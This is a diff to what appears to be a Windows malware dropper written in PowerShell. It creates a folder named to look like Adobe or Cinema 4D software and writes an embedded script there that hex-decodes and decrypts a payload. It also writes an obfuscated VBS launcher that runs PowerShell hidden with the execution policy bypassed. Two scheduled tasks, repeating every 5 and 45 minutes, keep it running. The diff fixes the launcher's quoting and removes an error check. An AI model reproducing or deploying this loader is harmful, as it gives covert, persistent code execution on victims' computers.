@@ -11,23 +11,14 @@ $programs = @(
     "Cinema4DAM",
     "LightroomXAM"
 )
-
 $paths = @(
     $env:AppData,
     "C:\ProgramData"
 )
-
 $randomProgram = Get-Random -InputObject $programs
 $randomPath = Get-Random -InputObject $paths
 $fullPath = Join-Path -Path $randomPath -ChildPath $randomProgram
-
 New-Item -Path $fullPath -ItemType Directory -Force | Out-Null
-
-if (-Not (Test-Path $fullPath)) {
-    Write-Error "فشل إنشاء المجلد: $fullPath"
-    return
-}
-
 $scriptContent = @"
 function HexStringToByteArray([string]`$hex) {
     `$bytes = New-Object byte[] (`$hex.Length / 2)
@@ -80,38 +71,28 @@ if (`$decBytes -ne `$null) {
 }
 Remove-Item `$tempPath -Force
 "@
-
 Set-Content -Path (Join-Path -Path $fullPath -ChildPath "$randomProgram.ps1") -Value $scriptContent -Force
-
-$vbsContent = @"
+$vbsContent = @'
 On Error Resume Next
 Dim arr, cmd, shell
-arr = Split(""p,o,w,e,r,s,h,e,l,l"", "","")
-cmd = Join(arr, """") & "" -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """" & WScript.Arguments(0) & """"
-Set shell = CreateObject(""WScript.Shell"")
+arr = Split("p,o,w,e,r,s,h,e,l,l", ",")
+cmd = Join(arr, "") & " -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """ & WScript.Arguments(0) & """"
+Set shell = CreateObject("WScript.Shell")
 shell.Run cmd, 0, False
-"@
-
+'@
 Set-Content -Path (Join-Path -Path $fullPath -ChildPath "$randomProgram.vbs") -Value $vbsContent -Force
-
 Start-Sleep 2
-
 try {
     $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$fullPath\$randomProgram.vbs`" `"$fullPath\$randomProgram.ps1`""
     $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $randomProgram -Force
 } catch {}
-
 Start-Sleep 2
-
 $taskName2 = "${randomProgram}Startup"
 $vbsFullPath = "$fullPath\$randomProgram.vbs"
 $ps1FullPath = "$fullPath\$randomProgram.ps1"
-
 try {
     schtasks /create /tn $taskName2 /tr "`"wscript.exe`" `"$vbsFullPath`" `"$ps1FullPath`"" /sc MINUTE /mo 45 /f
 } catch {}
-
 Start-Sleep 5
-
 schtasks /run /tn $randomProgram
